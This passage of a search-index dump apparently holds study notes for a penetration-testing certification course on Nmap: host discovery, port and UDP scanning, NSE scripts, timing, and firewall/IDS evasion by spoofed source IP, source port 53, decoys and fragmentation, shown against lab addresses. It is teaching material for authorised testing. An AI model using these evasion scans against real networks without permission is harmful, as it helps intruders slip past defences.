`--disable-arp-ping`: Disables ARP ping.\n- `--packet-trace`: Shows packets sent/received.\n- `-D &lt;IP(s)&gt;`: Adds decoy IPs.\n- `-sS`: SYN scan.\n- `-sA`: ACK scan.\n---\n#### Testing Firewall Rule\n\n\u00a0\u00a0Firewall and IDS/IPS Evasion\n\n```shell-session\n0xs5@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p445 -O\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:23 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.032s latency).\n\nPORT    STATE    SERVICE\n445/tcp filtered microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nToo many fingerprints match this host to give specific OS details\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 3.14 seconds\n</code></pre>"},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#scan-by-using-different-source-ip","title":"Scan by Using Different Source IP","text":"<p>Firewall and IDS/IPS Evasion</p> <pre><code>0xs5@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:16 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.010s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 4.11 seconds\n</code></pre> Scanning Options Description <code>10.129.2.28</code> Scans the specified target. <code>-n</code> Disables DNS resolution. <code>-Pn</code> Disables ICMP Echo requests. <code>-p 445</code> Scans only the specified ports. <code>-O</code> Performs operation system detection scan. <code>-S</code> Scans the target by using different source IP address. <code>10.129.2.200</code> Specifies the source IP address. <code>-e tun0</code> Sends all requests through the specified interface."},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#dns-proxying","title":"DNS Proxying","text":"<p>By default,\u00a0<code>Nmap</code>\u00a0performs a reverse DNS resolution unless otherwise specified to find more important information about our target. These DNS queries are also passed in most cases because the given web server is supposed to be found and visited. The DNS queries are made over the\u00a0<code>UDP port 53</code>. The\u00a0<code>TCP port 53</code>\u00a0was previously only used for the so-called \"<code>Zone transfers</code>\" between the DNS servers or data transfer larger than 512 bytes. More and more, this is changing due to IPv6 and DNSSEC expansions. These changes cause many DNS requests to be made via TCP port 53.</p> <p>However,\u00a0<code>Nmap</code>\u00a0still gives us a way to specify DNS servers ourselves (<code>--dns-server &lt;ns&gt;,&lt;ns&gt;</code>). This method could be fundamental to us if we are in a demilitarized zone (<code>DMZ</code>). The company's DNS servers are usually more trusted than those from the Internet. So, for example, we could use them to interact with the hosts of the internal network. As another example, we can use\u00a0<code>TCP port 53</code>\u00a0as a source port (<code>--source-port</code>) for our scans. If the administrator uses the firewall to control this port and does not filter IDS/IPS properly, our TCP packets will be trusted and passed through.</p>"},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#syn-scan-of-a-filtered-port","title":"SYN-Scan of a Filtered Port","text":"<p>Firewall and IDS/IPS Evasion</p> <pre><code>0xs5@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 22:50 CEST\nSENT (0.0417s) TCP 10.10.14.2:33436 &gt; 10.129.2.28:50000 S ttl=41 id=21939 iplen=44  seq=736533153 win=1024 &lt;mss 1460&gt;\nSENT (1.0481s) TCP 10.10.14.2:33437 &gt; 10.129.2.28:50000 S ttl=46 id=6446 iplen=44  seq=736598688 win=1024 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up.\n\nPORT      STATE    SERVICE\n50000/tcp filtered ibm-db2\n\nNmap done: 1 IP address (1 host up) scanned in 2.06 seconds\n</code></pre>"},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#syn-scan-from-dns-port","title":"SYN-Scan From DNS Port","text":"<p>Firewall and IDS/IPS Evasion</p> <pre><code>0xs5@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53\n\nSENT (0.0482s) TCP 10.10.14.2:53 &gt; 10.129.2.28:50000 S ttl=58 id=27470 iplen=44  seq=4003923435 win=1024 &lt;mss 1460&gt;\nRCVD (0.0608s) TCP 10.129.2.28:50000 &gt; 10.10.14.2:53 SA ttl=64 id=0 iplen=44  seq=540635485 win=64240 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up (0.013s latency).\n\nPORT      STATE SERVICE\n50000/tcp open  ibm-db2\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.08 seconds\n</code></pre> Scanning Options Description <code>10.129.2.28</code> Scans the specified target. <code>-p 50000</code> Scans only the specified ports. <code>-sS</code> Performs SYN scan on specified ports. <code>-Pn</code> Disables ICMP Echo requests. <code>-n</code> Disables DNS resolution. <code>--disable-arp-ping</code> Disables ARP ping. <code>--packet-trace</code> Shows all packets sent and received. <code>--source-port 53</code> Performs the scans from specified source port. <p>Now that we have found out that the firewall accepts\u00a0<code>TCP port 53</code>, it is very likely that IDS/IPS filters might also be configured much weaker than others. We can test this by trying to connect to this port by using\u00a0<code>Netcat</code>.</p>"},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#connect-to-the-filtered-port","title":"Connect To The Filtered Port","text":"<p>Firewall and IDS/IPS Evasion</p> <pre><code>0xs5@htb[/htb]$ ncat -nv --source-port 53 10.129.2.28 50000\n\nNcat: Version 7.80 ( https://nmap.org/ncat )\nNcat: Connected to 10.129.2.28:50000.\n220 ProFTPd\n</code></pre>"},{"location":"CPTS/Nmap/Firewall%20and%20IDS%20IPS%20Evasion/#study-tips","title":"Study Tips","text":"<ol> <li>Practice Commands: Get hands-on with Nmap\u2019s evasion options; understanding their output will help solidify the concepts.</li> <li>Flashcards: Make flashcards for key commands and flags (<code>-sS</code>, <code>-sA</code>, <code>-D</code>, <code>--packet-trace</code>, etc.) to reinforce learning.</li> <li>Simulate Scenarios: Set up small network labs with virtual machines to practice firewall/IDS/IPS detection and evasion.</li> <li>Review Response Codes: Recognize common ICMP error codes and TCP flags (RST, SYN-ACK) and their implications.</li> <li>Time Management: In the exam, prioritize evasion techniques if scans are blocked, and practice adjusting strategies on-the-fly.</li> </ol> <p>Next Lesson [[Firewall and IDs and IPs Evasion Labs]]</p>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/","title":"Host and Port Scanning","text":""},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul> <p>Understanding how scanning tools work is essential to interpreting results and identifying system vulnerabilities. When scanning a system, the goal is to gather key information such as:</p> <ul> <li>Open ports and their services</li> <li>Service versions</li> <li>Data provided by these services</li> <li>Operating system details</li> </ul>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#port-states-in-nmap","title":"Port States in Nmap","text":"<p>Nmap identifies six possible port states during scans:</p> <ol> <li>Open: A connection to the port is established (e.g., TCP, UDP, SCTP).</li> <li>Closed: The TCP packet received contains an RST flag, indicating that the port is closed. This can also help determine if a target is alive.</li> <li>Filtered: Nmap cannot determine whether the port is open or closed due to no response or receiving an error code.</li> <li>Unfiltered: Only occurs in TCP-ACK scans. The port is accessible, but its open/closed state cannot be determined.</li> <li>Open|Filtered: The port is not responding, potentially due to firewall or packet filtering.</li> <li>Closed|Filtered: Occurs in IP ID idle scans, indicating Nmap could not determine the port\u2019s status.</li> </ol>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#discovering-open-tcp-ports","title":"Discovering Open TCP Ports","text":"<ul> <li>Default Behavior: Nmap scans the top 1000 TCP ports using a SYN scan (<code>-sS</code>) if run as root. Otherwise, it uses a TCP connect scan (<code>-sT</code>).</li> <li>Port Selection: Ports can be scanned individually (e.g., <code>-p 22,25,80</code>), by range (<code>-p 22-445</code>), or using top frequent ports (<code>--top-ports=10</code>).</li> <li>Fast Scanning: Scans can be performed quickly using the top 100 ports (<code>-F</code>).</li> </ul>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#syn-scan-stealth-scan","title":"SYN Scan (Stealth Scan)","text":"<ul> <li>Packet Tracing Example:<ul> <li>A packet with the SYN flag is sent from our machine, and the target responds with RST and ACK flags if the port is closed.</li> <li>This method allows for faster and stealthier scanning.</li> <li>Options used: <code>-Pn</code> (disable ICMP), <code>-n</code> (disable DNS resolution), and <code>--disable-arp-ping</code>.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#connect-scan-full-tcp-handshake","title":"Connect Scan (Full TCP Handshake)","text":"<ul> <li>Process: Nmap uses the TCP three-way handshake to determine if a port is open. If the port responds with SYN-ACK, it is open. If it responds with RST, it is closed.</li> <li>Advantages:<ul> <li>More accurate since it completes the full handshake.</li> <li>Useful when interacting cleanly with services, especially when outgoing connections bypass firewalls.</li> </ul> </li> <li>Disadvantages:<ul> <li>Not stealthy, as it fully establishes connections, which are easily logged by firewalls and IDS/IPS systems.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#filtered-ports","title":"Filtered Ports","text":"<p>When ports are filtered, Nmap doesn't receive responses from the target, often due to firewalls or packet filters. It retries the packet several times (by default, 10 retries). Example scenarios include:</p> <ul> <li>Dropped packets: No response, leading Nmap to label the port as filtered.</li> <li>Rejected packets: The target returns an ICMP unreachable message (type 3/code 3), indicating the port is blocked by a firewall.</li> </ul>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#discovering-open-udp-ports","title":"Discovering Open UDP Ports","text":"<ul> <li>UDP Scans:<ul> <li>UDP scans (<code>-sU</code>) do not involve a three-way handshake and are slower compared to TCP scans.</li> <li>UDP is a stateless protocol, and timeouts make scanning slower since no acknowledgments are received from the target.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#example-scanning-techniques","title":"Example Scanning Techniques","text":"<ul> <li> <p>Scanning top 10 TCP ports: <pre><code>sudo nmap 10.129.2.28 --top-ports=10\n</code></pre>     Output includes information about the state of the most frequent ports (e.g., SSH, HTTP).</p> </li> <li> <p>Packet tracing SYN scan: <pre><code>sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping\n</code></pre>     This shows SYN flags being sent to the target, and the RST/ACK response when the port is closed.</p> </li> <li> <p>Connect scan on TCP port 443: <pre><code>sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT\n</code></pre>     Shows the three-way handshake used to establish if port 443 is open (HTTPS).</p> </li> <li> <p>UDP scan example: <pre><code>sudo nmap 10.129.2.28 -F -sU\n</code></pre>     This performs a fast UDP scan and can reveal open UDP ports on the target.</p> </li> </ul>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#key-nmap-options-used-in-examples","title":"Key Nmap Options Used in Examples","text":"<ul> <li><code>-sS</code>: SYN scan (stealth).</li> <li><code>-sT</code>: TCP connect scan (full handshake).</li> <li><code>-p</code>: Specify port(s) to scan.</li> <li><code>-Pn</code>: Disable ICMP echo requests (assumes host is up).</li> <li><code>-n</code>: Disable DNS resolution.</li> <li><code>--packet-trace</code>: Show packets sent/received.</li> <li><code>--disable-arp-ping</code>: Disable ARP ping.</li> </ul>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#nmap-host-discovery","title":"Nmap Host Discovery","text":"<p>Nmap offers various techniques for host discovery. This helps in determining which hosts are up before scanning ports and services.</p> <ol> <li> <p>ICMP Echo Request (<code>ping</code>):     <pre><code>nmap -sn 10.129.2.28\n</code></pre></p> </li> <li> <p>TCP SYN Ping:     <pre><code>nmap -PS443 10.129.2.28\n</code></pre></p> </li> <li> <p>TCP ACK Ping:     <pre><code>nmap -PA80,443 10.129.2.28\n</code></pre></p> </li> <li> <p>UDP Ping:     <pre><code>nmap -PU53,123 10.129.2.28\n</code></pre></p> </li> <li> <p>ARP Ping:     <pre><code>nmap -PR 10.129.2.0/24\n</code></pre></p> </li> <li> <p>Disabling Ping (<code>-Pn</code>):     <pre><code>nmap -Pn 10.129.2.28\n</code></pre></p> </li> </ol>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#service-version-detection","title":"Service Version Detection","text":"<ul> <li> <p>Service Version Detection (<code>-sV</code>):     <pre><code>sudo nmap -sV 10.129.2.28\n</code></pre></p> </li> <li> <p>Version Intensity (<code>--version-intensity</code>):     <pre><code>sudo nmap --version-intensity 9 10.129.2.28\n</code></pre></p> </li> </ul>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#operating-system-os-detection","title":"Operating System (OS) Detection","text":"<ul> <li> <p>OS Detection (<code>-O</code>):     <pre><code>sudo nmap -O 10.129.2.28\n</code></pre></p> </li> <li> <p>Aggressive Scanning (<code>-A</code>):     <pre><code>sudo nmap -A 10.129.2.28\n</code></pre></p> </li> </ul>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#script-scanning-with-nmap-nse","title":"Script Scanning with Nmap (NSE)","text":"<ol> <li> <p>Default Scripts:     <pre><code>sudo nmap -sC 10.129.2.28\n</code></pre></p> </li> <li> <p>Specifying a Script:     <pre><code>sudo nmap --script http-enum 10.129.2.28\n</code></pre></p> </li> <li> <p>Using Vulnerability Scripts:     <pre><code>sudo nmap --script ssl-heartbleed 10.129.2.28\n</code></pre></p> </li> <li> <p>Script Categories:     <pre><code>sudo nmap --script vuln 10.129.2.28\n</code></pre></p> </li> </ol>"},{"location":"CPTS/Nmap/Host%20and%20Port%20Scanning/#nmap-timing-and-performance-options","title":"Nmap Timing and Performance Options","text":"<ul> <li> <p>Timing Templates (<code>-T</code>):     <pre><code>sudo nmap -T4 10.129.2.28\n</code></pre></p> </li> <li> <p>Max Parallelism (<code>--min-parallelism</code> and <code>--max-parallelism</code>):     <pre><code>sudo nmap --min-parallelism 10 --max-parallelism 100 10.129.2.28\n</code></pre></p> </li> </ul> <p>This comprehensive coverage of host and port scanning, service and version detection, operating system identification, and advanced scripting illustrates how powerful Nmap is for vulnerability assessment and network discovery.</p>"},{"location":"CPTS/Nmap/Nmap%20Host%20Discovery/","title":"Nmap Host Discovery","text":""},{"location":"CPTS/Nmap/Nmap%20Host%20Discovery/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul> <p>Introduction to Nmap Host Discovery</p> <p>Host discovery is crucial in identifying systems that are online and can be tested in a network during penetration testing. Nmap provides various techniques to perform host discovery effectively. This process helps determine which systems are live and ready for further security assessment. Here's a detailed breakdown of Nmap's commands and scanning options used for host discovery.</p>"},{"location":"CPTS/Nmap/Nmap%20Host%20Discovery/#scan-network-range","title":"Scan Network Range","text":"<p>Command:</p> <pre><code>    sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5\n    ```\n\n- **Description**: Scans an entire network range (e.g., `/24`) for live hosts without performing port scans.\n- **Options:**\n    - `10.129.2.0/24`: The network range to scan.\n    - `sn`: Disables port scanning; only checks if hosts are up.\n    - `oA tnet`: Stores results in all formats starting with the prefix 'tnet'.\n\n---\n\n### **Scan IP List**\n\n**Command:**\n\n```bash\nsudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5\n</code></pre> <ul> <li>Description: Scans hosts from a predefined list.</li> <li>Options:<ul> <li><code>iL hosts.lst</code>: Reads a list of target hosts from <code>hosts.lst</code>.</li> <li><code>oA tnet</code>: Stores the results in multiple formats starting with 'tnet'.</li> <li><code>sn</code>: Disables port scanning.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Nmap%20Host%20Discovery/#scan-multiple-ips","title":"Scan Multiple IPs","text":"<p>Command:</p> <pre><code>sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20 | grep for | cut -d\" \" -f5\n</code></pre> <ul> <li>Description: Scans specific IP addresses without performing port scanning.</li> <li>Options:<ul> <li>Multiple IP addresses (e.g., <code>10.129.2.18 10.129.2.19 10.129.2.20</code>): Specifies multiple targets.</li> <li><code>sn</code>: Disables port scanning.</li> </ul> </li> </ul> <p>Alternatively, you can scan a range of IPs:</p> <pre><code>sudo nmap -sn -oA tnet 10.129.2.18-20 | grep for | cut -d\" \" -f5\n</code></pre>"},{"location":"CPTS/Nmap/Nmap%20Host%20Discovery/#scan-a-single-ip","title":"Scan a Single IP","text":"<p>Command:</p> <pre><code>sudo nmap 10.129.2.18 -sn -oA host\n</code></pre> <ul> <li>Description: Scans a single host to check if it is online.</li> <li>Options:<ul> <li><code>10.129.2.18</code>: The target IP address.</li> <li><code>sn</code>: Disables port scanning.</li> <li><code>oA host</code>: Stores results starting with the prefix 'host'.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Nmap%20Host%20Discovery/#enable-icmp-echo-requests","title":"Enable ICMP Echo Requests","text":"<p>Nmap uses ARP requests by default for host discovery. To force ICMP Echo requests, use the <code>-PE</code> option.</p> <p>Command:</p> <pre><code>sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace\n</code></pre> <ul> <li>Options:<ul> <li><code>PE</code>: Performs ICMP Echo request (ping) to check if a host is alive.</li> <li><code>-packet-trace</code>: Displays all packets sent and received for analysis.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Nmap%20Host%20Discovery/#view-the-reason-for-host-detection","title":"View the Reason for Host Detection","text":"<p>You can use the <code>--reason</code> option to check why a host is marked as alive.</p> <p>Command:</p> <pre><code>sudo nmap 10.129.2.18 -sn -oA host -PE --reason\n</code></pre> <ul> <li>Option:<ul> <li><code>-reason</code>: Displays the reason why the host is detected as alive.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Nmap%20Host%20Discovery/#disable-arp-pings","title":"Disable ARP Pings","text":"<p>To disable ARP pings and rely solely on ICMP Echo requests:</p> <p>Command:</p> <pre><code>sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping\n</code></pre> <ul> <li>Option:<ul> <li><code>-disable-arp-ping</code>: Prevents Nmap from sending ARP pings, using ICMP Echo requests instead.</li> </ul> </li> </ul>"},{"location":"CPTS/Nmap/Nmap%20Host%20Discovery/#ttl-and-os-detection","title":"TTL and OS Detection","text":"<p>In the example below, you can analyze the TTL (Time to Live) value to infer the target OS.</p> <p>Example:</p> <pre><code>SENT (0.0107s) ICMP [10.10.14.2 &gt; 10.129.2.18 Echo request (type=8/code=0)]\nRCVD (0.0152s) ICMP [10.129.2.18 &gt; 10.10.14.2 Echo reply (type=0/code=0)] IP [ttl=128]\n</code></pre> <ul> <li>TTL = 128: Likely indicates a Windows operating system.</li> </ul>"},{"location":"CPTS/Nmap/Nmap%20Host%20Discovery/#additional-resources","title":"Additional Resources","text":"<p>For more advanced host discovery strategies, visit the Nmap book: https://nmap.org/book/host-discovery-strategies.html</p> <p>By mastering these Nmap commands and techniques, you'll be well-equipped to conduct thorough host discovery for penetration testing and network auditing purposes.</p> <p>Next [[Host and Port Scanning]]</p>"},{"location":"CPTS/Nmap/Nmap/","title":"Nmap","text":"<p>Overview</p> <ul> <li>Network Mapper (Nmap): Open-source network analysis tool for network scanning, written in C, C++, Python, and Lua.</li> <li>Key Purpose: Scans networks to identify hosts, services, applications, versions, operating systems, and security defenses like firewalls and IDS.</li> </ul> <p>Nmap Use Cases</p> <ul> <li>Security Auditing: Check network security, firewall, and IDS settings.</li> <li>Penetration Testing: Simulate attacks to find vulnerabilities.</li> <li>Network Mapping: Understand the structure of the network, identify devices, and open ports.</li> <li>Response Analysis: Analyze how devices and services respond to probing.</li> </ul> <p>Nmap Architecture</p> <p>Nmap's core functionalities can be broken down into the following techniques:</p> <ol> <li>Host Discovery: Identify live hosts on a network.</li> <li>Port Scanning: Check open/closed/filtered ports.</li> <li>Service Enumeration &amp; Detection: Identify running services and versions.</li> <li>OS Detection: Discover the operating system and version on the target machine.</li> <li>Nmap Scripting Engine (NSE): Automate advanced interaction and service scanning with scripts.</li> </ol>"},{"location":"CPTS/Nmap/Nmap/#nmap-syntax","title":"Nmap Syntax","text":"<p>Basic command structure:</p> <pre><code>nmap &lt;scan types&gt; &lt;options&gt; &lt;target&gt;\n</code></pre>"},{"location":"CPTS/Nmap/Nmap/#common-scan-techniques","title":"Common Scan Techniques","text":"<p>1. TCP Scans</p> <ul> <li>TCP SYN Scan (-sS): Default scan that sends a SYN packet to detect open ports without completing the TCP three-way handshake.<ul> <li>SYN-ACK Response: Port is open.</li> <li>RST Response: Port is closed.</li> <li>No Response: Port is filtered.</li> </ul> </li> </ul> <p>2. TCP Connect Scan (-sT): Establishes a full connection (three-way handshake). Slower but more reliable for some networks.</p> <p>3. TCP ACK Scan (-sA): Determines whether a firewall is stateless or stateful by sending ACK packets.</p> <p>4. TCP Window Scan (-sW): Similar to ACK scan but checks TCP Window field to determine port status.</p> <p>5. TCP Maimon Scan (-sM): Rarely used, checks for open ports with an RST/ACK response.</p> <p>6. UDP Scan (-sU): Scans for open UDP ports; slower and harder to perform since UDP is connectionless.</p> <p>7. Null, FIN, Xmas Scans (-sN, -sF, -sX): Send unusual packet combinations to bypass some firewalls and IDS:</p> <ul> <li>Null Scan (-sN): No flags set.</li> <li>FIN Scan (-sF): Sends FIN flag.</li> <li>Xmas Scan (-sX): Sends FIN, PSH, and URG flags.</li> </ul> <p>8. IP Protocol Scan (-sO): Detects supported IP protocols on the target.</p> <p>9. SCTP INIT/COOKIE-ECHO Scan (-sY, -sZ): Scan Stream Control Transmission Protocol (SCTP) INIT and COOKIE-ECHO ports.</p> <p>10. FTP Bounce Scan (-b): Attempts to scan through an FTP server, using it as a proxy.</p> <p>11. Idle Scan (-sI): Advanced, stealth scan using a \"zombie\" host to hide the attacker's identity.</p>"},{"location":"CPTS/Nmap/Nmap/#example-nmap-scans","title":"Example Nmap Scans","text":"<p>Basic TCP SYN Scan Example</p> <pre><code>sudo nmap -sS localhost\n</code></pre> <p>Output Explanation:</p> <ul> <li>PORT: Number of the open port.</li> <li>STATE: Whether the port is open, closed, or filtered.</li> <li>SERVICE: The type of service running on that port (e.g., SSH, HTTP).</li> </ul>"},{"location":"CPTS/Nmap/Nmap/#advanced-nmap-commands","title":"Advanced Nmap Commands","text":"<ol> <li> <p>Service Version Detection (-sV)</p> <ul> <li>Detects the version of the service running on open ports.</li> </ul> <pre><code>nmap -sV &lt;target&gt;\n</code></pre> </li> <li> <p>Operating System Detection (-O)</p> <ul> <li>Identifies the operating system and its version.</li> </ul> <pre><code>nmap -O &lt;target&gt;\n</code></pre> </li> <li> <p>Aggressive Scan (-A)</p> <ul> <li>Combines OS detection, version detection, script scanning, and traceroute for detailed information.</li> </ul> <pre><code>nmap -A &lt;target&gt;\n</code></pre> </li> <li> <p>Script Scan with NSE (-sC)</p> <ul> <li>Uses Nmap Scripting Engine to run default scripts on the target.</li> </ul> <pre><code>nmap -sC &lt;target&gt;\n</code></pre> </li> <li> <p>Scan Specific Ports (-p)</p> <ul> <li>Specify a range of ports to scan (e.g., from port 1 to 1000).</li> </ul> <pre><code>nmap -p 1-1000 &lt;target&gt;\n</code></pre> </li> <li> <p>Excluding Specific Hosts (--exclude)</p> <ul> <li>Exclude certain hosts from the scan.</li> </ul> <pre><code>nmap --exclude &lt;host&gt; &lt;target&gt;\n</code></pre> </li> <li> <p>Scan Multiple Hosts</p> <ul> <li>Scan multiple IP addresses at once.</li> </ul> <pre><code>nmap &lt;target1&gt; &lt;target2&gt; &lt;target3&gt;\n</code></pre> </li> <li> <p>Evade Firewalls and IDS (-D, -f)</p> <ul> <li> <p>Decoy Scan (-D): Uses decoy IPs to hide the actual attacker.</p> <pre><code>nmap -D RND:10 &lt;target&gt;\n</code></pre> </li> <li> <p>Fragmentation (-f): Sends fragmented packets to bypass firewalls.</p> <pre><code>nmap -f &lt;target&gt;\n</code></pre> </li> </ul> </li> <li> <p>Timing &amp; Performance Options (-T0 to -T5)</p> <ul> <li>Control speed and stealth of scans, ranging from <code>T0</code> (slowest, stealthiest) to <code>T5</code> (fastest).</li> </ul> <pre><code>nmap -T4 &lt;target&gt;\n</code></pre> </li> <li> <p>Save Scan Output (-oN, -oX, -oG)</p> <ul> <li>Save scan results in different formats (normal, XML, greppable).</li> </ul> <pre><code>nmap -oN output.txt &lt;target&gt;\n</code></pre> </li> </ol>"},{"location":"CPTS/Nmap/Nmap/#study-tips-for-nmap","title":"Study Tips for Nmap","text":"<ol> <li>Memorize Core Scans: Focus on common commands like <code>sS</code>, <code>sU</code>, <code>A</code>, and <code>O</code>.</li> <li>Practice on Different Networks: Set up virtual machines to simulate various network environments and practice different Nmap scans.</li> <li>Use NSE Scripts: Get comfortable with Nmap Scripting Engine to automate specific tasks and advanced scans.</li> <li>Explore Firewall Evasion: Learn techniques to bypass security measures such as decoy scans and fragmented packets.</li> <li>Timing &amp; Performance Adjustments: Test scans with different <code>T</code> options to understand the balance between speed and stealth.</li> <li>Analyze Outputs: Spend time understanding scan results, focusing on the meaning of open, closed, and filtered ports.</li> <li>Watch Tutorials: Supplement your practice by watching videos on Nmap techniques, especially advanced scans.</li> <li>Stay Current: Keep updated on new Nmap features and scripts by visiting the Nmap website.</li> </ol> <p>Next [[Nmap Host Discovery]]</p>"},{"location":"CPTS/Nmap/Performance/","title":"Performance","text":""},{"location":"CPTS/Nmap/Performance/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul>"},{"location":"CPTS/Nmap/Performance/#performance","title":"Performance","text":"<p>Scanning performance plays a significant role when we need to scan an extensive network or are dealing with low network bandwidth. We can use various options to tell\u00a0<code>Nmap</code>\u00a0how fast (<code>-T &lt;0-5&gt;</code>), with which frequency (<code>--min-parallelism &lt;number&gt;</code>), which timeouts (<code>--max-rtt-timeout &lt;time&gt;</code>) the test packets should have, how many packets should be sent simultaneously (<code>--min-rate &lt;number&gt;</code>), and with the number of retries (<code>--max-retries &lt;number&gt;</code>) for the scanned ports the targets should be scanned.</p>"},{"location":"CPTS/Nmap/Performance/#timeouts","title":"Timeouts","text":"<p>When Nmap sends a packet, it takes some time (<code>Round-Trip-Time</code>\u00a0-\u00a0<code>RTT</code>) to receive a response from the scanned port. Generally,\u00a0<code>Nmap</code>\u00a0starts with a high timeout (<code>--min-RTT-timeout</code>) of 100ms. Let us look at an example by scanning the whole network with 256 hosts, including the top 100 ports.</p>"},{"location":"CPTS/Nmap/Performance/#default-scan","title":"Default Scan","text":"<p>Performance</p> <pre><code>0xs5@htb[/htb]$ sudo nmap 10.129.2.0/24 -F\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 39.44 seconds\n</code></pre>"},{"location":"CPTS/Nmap/Performance/#optimized-rtt","title":"Optimized RTT","text":"<p>Performance</p> <pre><code>0xs5@htb[/htb]$ sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (8 hosts up) scanned in 12.29 seconds\n</code></pre> Scanning Options Description <code>10.129.2.0/24</code> Scans the specified target network. <code>-F</code> Scans top 100 ports. <code>--initial-rtt-timeout 50ms</code> Sets the specified time value as initial RTT timeout. <code>--max-rtt-timeout 100ms</code> Sets the specified time value as maximum RTT timeout. <p>When comparing the two scans, we can see that we found two hosts less with the optimized scan, but the scan took only a quarter of the time. From this, we can conclude that setting the initial RTT timeout (<code>--initial-rtt-timeout</code>) to too short a time period may cause us to overlook hosts.</p>"},{"location":"CPTS/Nmap/Performance/#max-retries","title":"Max Retries","text":"<p>Another way to increase scan speed is by specifying the retry rate of sent packets (<code>--max-retries</code>). The default value is\u00a0<code>10</code>, but we can reduce it to\u00a0<code>0</code>. This means if Nmap does not receive a response for a port, it won't send any more packets to that port and will skip it.</p>"},{"location":"CPTS/Nmap/Performance/#default-scan_1","title":"Default Scan","text":"<p>Performance</p> <pre><code>0xs5@htb[/htb]$ sudo nmap 10.129.2.0/24 -F | grep \"/tcp\" | wc -l\n\n23\n</code></pre>"},{"location":"CPTS/Nmap/Performance/#reduced-retries","title":"Reduced Retries","text":"<p>Performance</p> <pre><code>0xs5@htb[/htb]$ sudo nmap 10.129.2.0/24 -F --max-retries 0 | grep \"/tcp\" | wc -l\n\n21\n</code></pre> Scanning Options Description <code>10.129.2.0/24</code> Scans the specified target network. <code>-F</code> Scans top 100 ports. <code>--max-retries 0</code> Sets the number of retries that will be performed during the scan. <p>Again, we recognize that accelerating can also have a negative effect on our results, which means we can overlook important information.</p>"},{"location":"CPTS/Nmap/Performance/#rates","title":"Rates","text":"<p>During a white-box penetration test, we may get whitelisted for the security systems to check the systems in the network for vulnerabilities and not only test the protection measures. If we know the network bandwidth, we can work with the rate of packets sent, which significantly speeds up our scans 